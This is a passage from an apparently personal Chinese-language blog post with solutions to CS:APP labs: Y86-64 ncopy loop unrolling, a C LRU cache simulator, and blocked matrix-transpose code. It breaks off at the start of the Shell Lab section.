0?</span><br><span class="line">jmp test# if so, goto Done:</span><br><span class="line"></span><br><span class="line"># Loop header</span><br><span class="line">    andq %rdx,%rdx      # len &lt;= 0?</span><br><span class="line">    jmp test</span><br><span class="line">Loop:</span><br><span class="line">    mrmovq (%rdi),%r8</span><br><span class="line">    rmmovq %r8,(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Loop1</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">Loop1:</span><br><span class="line">    mrmovq 8(%rdi),%r8</span><br><span class="line">    rmmovq %r8,8(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Loop2</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">Loop2:</span><br><span class="line">    mrmovq 16(%rdi),%r8</span><br><span class="line">    rmmovq %r8,16(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Loop3</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">Loop3:</span><br><span class="line">    mrmovq 24(%rdi),%r8</span><br><span class="line">    rmmovq %r8,24(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Loop4</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">Loop4:</span><br><span class="line">    mrmovq 32(%rdi),%r8</span><br><span class="line">    rmmovq %r8,32(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Loop5</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">Loop5:</span><br><span class="line">    mrmovq 40(%rdi),%r8</span><br><span class="line">    rmmovq %r8,40(%rsi)</span><br><span class="line">    iaddq $48,%rdi</span><br><span class="line">    iaddq $48,%rsi</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle test</span><br><span class="line">    iaddq $1,%rax  </span><br><span class="line"></span><br><span class="line">test:</span><br><span class="line">    iaddq $-6, %rdx         # 先减，判断够不够6个</span><br><span class="line">    jge Loop                # 6路展开</span><br><span class="line">    iaddq $6, %rdx</span><br><span class="line">    jmp test2               #剩下的</span><br><span class="line"></span><br><span class="line">L:</span><br><span class="line">    mrmovq (%rdi),%r8</span><br><span class="line">    rmmovq %r8,(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle L1</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">L1:</span><br><span class="line">    mrmovq 8(%rdi),%r8</span><br><span class="line">    rmmovq %r8,8(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle L2</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">L2:</span><br><span class="line">    mrmovq 16(%rdi),%r8</span><br><span class="line">    rmmovq %r8,16(%rsi)</span><br><span class="line">    iaddq $24,%rdi</span><br><span class="line">    iaddq $24,%rsi</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle test2</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">test2:</span><br><span class="line">    iaddq $-3, %rdx         # 先减，判断够不够3个</span><br><span class="line">    jge L</span><br><span class="line">    iaddq $2, %rdx          # -1则不剩了，直接Done,0 剩一个, 1剩2个</span><br><span class="line">    je R0</span><br><span class="line">    jl Done</span><br><span class="line">    mrmovq (%rdi),%r8</span><br><span class="line">    rmmovq %r8,(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle R2</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">R2:</span><br><span class="line">    mrmovq 8(%rdi),%r8</span><br><span class="line">    rmmovq %r8,8(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Done</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">    jmp Done</span><br><span class="line">R0:</span><br><span class="line">    mrmovq (%rdi),%r8</span><br><span class="line">    rmmovq %r8,(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Done</span><br><span class="line">    iaddq $1,%rax</span><br></pre></td></tr></tbody></table></figure><h3 id="消除气泡"><a href="#消除气泡" class="headerlink" title="消除气泡"></a>消除气泡</h3><p>注意到程序中的这个操作,会触发加载/使用数据冒险,导致插入一个气泡指令.<br>所以我们可以一次性复制两个数据,避免加载/使用数据冒险</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mrmovq (%rdi), %r8</span><br><span class="line">mrmovq 8(%rdi), %r9</span><br><span class="line">rmmovq %r8, (%rsi)</span><br><span class="line">rmmovq %r9, 8(%rsi)</span><br></pre></td></tr></tbody></table></figure><p>消除后得分45.4</p><h1 id="Lab5-Cache-Lab"><a href="#Lab5-Cache-Lab" class="headerlink" title="Lab5:Cache Lab"></a>Lab5:Cache Lab</h1><h2 id="Part-A-1"><a href="#Part-A-1" class="headerlink" title="Part A"></a>Part A</h2><p>模拟Cache的实现.<br>最开始的时候没有看到实验材料里的这句话,考虑复杂了…</p><blockquote><p>For this this lab, you should assume that memory accesses arealigned properly,  such that a singlememory  access  never  crosses  block  boundaries.   By  making  this  assumption,  you  can  ignore  therequest sizes in thevalgrindtraces</p></blockquote><p>大概实现了这样的数据结构,实验采取的是LRU策略,可以用链表来组织实现,我这里就用时间戳代替了.(ps:用time(NULL)获取的时间戳不够准确会造成多个行的时间戳相同,使用clock()代替或使用全局变量记录次数.)</p><blockquote><p>LRU，最近最少使用策略。替换最后一次访问时间最久远的哪一行<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305182207207.png"></p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"cachelab.h"</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;getopt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CacheLine</span>{</span></span><br><span class="line">    <span class="type">int</span> valid;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> time;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> tag;</span><br><span class="line">}CacheLine;</span><br><span class="line"></span><br><span class="line">CacheLine** Cache = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> groupcount = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> blocksize = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> s,E,b,t;</span><br><span class="line"><span class="type">char</span> verbose = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> misses = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> hits = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> evictions = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//因为不需要实际访问数据内容,所以不需要分配2^b字节的数据空间.</span></span><br><span class="line"><span class="comment">//只要地址位于某Set中且标志位相同,则hit</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Cache_Init</span><span class="params">(<span class="type">int</span> s,<span class="type">int</span> E,<span class="type">int</span> b)</span></span><br><span class="line">{</span><br><span class="line">    groupcount = <span class="built_in">pow</span>(<span class="number">2</span>,s);</span><br><span class="line">    blocksize = <span class="built_in">pow</span>(<span class="number">2</span>,b);</span><br><span class="line">    Cache = (CacheLine**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CacheLine*)*groupcount);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;groupcount;++i)</span><br><span class="line">    {</span><br><span class="line">        Cache[i] = (CacheLine*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CacheLine)*E);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j&lt;E;++j)</span><br><span class="line">        {</span><br><span class="line">            Cache[i][j].valid = <span class="number">0</span>;</span><br><span class="line">            Cache[i][j].time = <span class="number">0</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hit</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(verbose==<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" hit"</span>);</span><br><span class="line">    ++hits;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">miss</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(verbose==<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" miss"</span>);</span><br><span class="line">    ++misses;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">eviction</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(verbose==<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" eviction"</span>);</span><br><span class="line">    ++evictions;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">AccessMemory</span><span class="params">(<span class="type">long</span> <span class="type">long</span> addr,<span class="type">int</span> size)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">//这个地方使用掩码提取而不是直接移位,是因为算术右移会使标记发生变化.</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> mask;</span><br><span class="line">    <span class="comment">//注意制作掩码的时候的常数类型LL</span></span><br><span class="line">    mask = (<span class="number">1LL</span> &lt;&lt; (s + b)) - <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> Setindex = (mask &amp; addr) &gt;&gt; b;</span><br><span class="line">    <span class="comment">// mask = (1LL &lt;&lt; b) - 1;</span></span><br><span class="line">    <span class="comment">// int blockoffset = mask &amp; addr;</span></span><br><span class="line">    mask = (<span class="number">1LL</span> &lt;&lt; t) - <span class="number">1</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> tag = (addr &gt;&gt; (s + b)) &amp; mask;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    CacheLine* CacheSet = Cache[Setindex];</span><br><span class="line">    <span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> LRtime = CacheSet[<span class="number">0</span>].time;</span><br><span class="line">    <span class="type">int</span> LRid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;E;++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(CacheSet[i].valid==<span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            miss();</span><br><span class="line">            CacheSet[i].tag = tag;</span><br><span class="line">            CacheSet[i].valid = <span class="number">1</span>;</span><br><span class="line">            CacheSet[i].time = clock();</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(CacheSet[i].tag==tag)</span><br><span class="line">        {</span><br><span class="line">            hit();</span><br><span class="line">            CacheSet[i].time = clock();</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(CacheSet[i].time&lt;LRtime)</span><br><span class="line">        {</span><br><span class="line">            LRtime = CacheSet[i].time;</span><br><span class="line">            LRid = i;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(flag==<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        miss();</span><br><span class="line">        CacheSet[LRid].tag = tag;</span><br><span class="line">        CacheSet[LRid].time = clock();</span><br><span class="line">        eviction();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* trace = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> optc;</span><br><span class="line">    <span class="keyword">while</span>((optc = getopt(argc,(<span class="type">char</span>* <span class="type">const</span> *)argv,<span class="string">"vs:E:b:t:"</span>))!=<span class="number">-1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">switch</span>(optc)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">                s = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'E'</span>:</span><br><span class="line">                E = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'b'</span>:</span><br><span class="line">                b = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'t'</span>:</span><br><span class="line">                trace = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(optarg)+<span class="number">1</span>);</span><br><span class="line">                <span class="built_in">strcpy</span>(trace,optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'v'</span>:</span><br><span class="line">                verbose = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;                </span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    t = <span class="number">64</span>-s-b;</span><br><span class="line"></span><br><span class="line">    Cache_Init(s,E,b);</span><br><span class="line"></span><br><span class="line">    FILE* tracefile = fopen(trace,<span class="string">"r"</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> opt;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> addr;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">50</span>);</span><br><span class="line">        fgets(buf,<span class="number">50</span>,tracefile);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">sscanf</span>(buf,<span class="string">" %c %llx,%d"</span>,&amp;opt,&amp;addr,&amp;size)!=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">switch</span>(opt)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'I'</span>:</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'L'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'S'</span>:</span><br><span class="line">                <span class="keyword">if</span>(verbose==<span class="number">1</span>)</span><br><span class="line">                {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%c %llx,%d"</span>,opt,addr,size);</span><br><span class="line">                    AccessMemory(addr,size);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">" \n"</span>);</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    AccessMemory(addr,size);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'M'</span>:</span><br><span class="line">                <span class="keyword">if</span>(verbose==<span class="number">1</span>)</span><br><span class="line">                {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%c %llx,%d"</span>,opt,addr,size);</span><br><span class="line">                    AccessMemory(addr,size);</span><br><span class="line">                    AccessMemory(addr,size);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">" \n"</span>);</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                {</span><br><span class="line">                    AccessMemory(addr,size);</span><br><span class="line">                    AccessMemory(addr,size);</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    printSummary(hits,misses,evictions);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(trace);</span><br><span class="line">    trace = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;groupcount;++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">free</span>(Cache[i]);</span><br><span class="line">        Cache[i] = <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">free</span>(Cache);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>完成的截图<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305182159330.png"></p><h2 id="Part-B-1"><a href="#Part-B-1" class="headerlink" title="Part B"></a>Part B</h2><p><a href="https://zhuanlan.zhihu.com/p/387662272">https://zhuanlan.zhihu.com/p/387662272</a></p><h3 id="32x32"><a href="#32x32" class="headerlink" title="32x32"></a>32x32</h3><h4 id="暴力转置"><a href="#暴力转置" class="headerlink" title="暴力转置"></a>暴力转置</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i, j, tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++) {</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j++) {</span><br><span class="line">            tmp = A[i][j];</span><br><span class="line">            B[j][i] = tmp;</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305241452391.png"></p><h4 id="分块转置"><a href="#分块转置" class="headerlink" title="分块转置"></a>分块转置</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">int</span> i1,j1;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;M;j+=<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;M;i+=<span class="number">8</span>)</span><br><span class="line">            <span class="keyword">for</span>(j1 = j;j1&lt;j+<span class="number">8</span>;++j1)</span><br><span class="line">                <span class="keyword">for</span>(i1 = i;i1&lt;i+<span class="number">8</span>;++i1)</span><br><span class="line">                    B[j1][i1] = A[i1][j1];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305241452306.png"></p><h4 id="分块-变量存储"><a href="#分块-变量存储" class="headerlink" title="分块+变量存储"></a>分块+变量存储</h4><p>A和B矩阵相同下标的元素映射到缓存的同一组(回忆一下缓存的分组机制)<br>所以对于对角线上的元素,AB的连续访问发生冲突.<br>这里可以用空间换时间,一次将进入缓存的一整行读出来保存到临时变量中.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">int</span> j1;</span><br><span class="line">    <span class="type">int</span> val1,val2,val3,val4,val5,val6,val7,val0;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;M;j+=<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;M;i+=<span class="number">8</span>)</span><br><span class="line">            <span class="keyword">for</span>(j1 = j;j1&lt;j+<span class="number">8</span>;++j1)</span><br><span class="line">            {</span><br><span class="line">                val0 = A[j1][i];</span><br><span class="line">                val1 = A[j1][i+<span class="number">1</span>];</span><br><span class="line">                val2 = A[j1][i+<span class="number">2</span>];</span><br><span class="line">                val3 = A[j1][i+<span class="number">3</span>];</span><br><span class="line">                val4 = A[j1][i+<span class="number">4</span>];</span><br><span class="line">                val5 = A[j1][i+<span class="number">5</span>];</span><br><span class="line">                val6 = A[j1][i+<span class="number">6</span>];</span><br><span class="line">                val7 = A[j1][i+<span class="number">7</span>];</span><br><span class="line">                B[i][j1] = val0;</span><br><span class="line">                B[i+<span class="number">1</span>][j1] = val1;</span><br><span class="line">                B[i+<span class="number">2</span>][j1] = val2;</span><br><span class="line">                B[i+<span class="number">3</span>][j1] = val3;</span><br><span class="line">                B[i+<span class="number">4</span>][j1] = val4;</span><br><span class="line">                B[i+<span class="number">5</span>][j1] = val5;</span><br><span class="line">                B[i+<span class="number">6</span>][j1] = val6;</span><br><span class="line">                B[i+<span class="number">7</span>][j1] = val7;</span><br><span class="line">            }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305241453434.png"></p><h3 id="64x64"><a href="#64x64" class="headerlink" title="64x64"></a>64x64</h3><p>按照8x8分块,块的内部会发生冲突,于是使用4x4分块.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> transpose_submit_desc[] = <span class="string">"Transpose submission"</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">int</span> i1,j1;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;M;j+=<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;M;i+=<span class="number">4</span>)</span><br><span class="line">            <span class="keyword">for</span>(j1 = j;j1&lt;j+<span class="number">4</span>;++j1)</span><br><span class="line">                <span class="keyword">for</span>(i1 = i;i1&lt;i+<span class="number">4</span>;++i1)</span><br><span class="line">                    B[j1][i1] = A[i1][j1];</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305241548256.png"></p><h1 id="Lab6-Shell-lab"><a href="#Lab6-Shell-lab" class="headerlink" title="Lab6:Shell lab"></a>Lab6:Shell lab</h1><p>实现一个有工作分配,信号处理,进程回收的shell.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306190955121.png"></p><h2 id="部分实现"><a href="#部分实现" class="headerlink" title="部分实现"></a>部分实现</h2><h3 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span 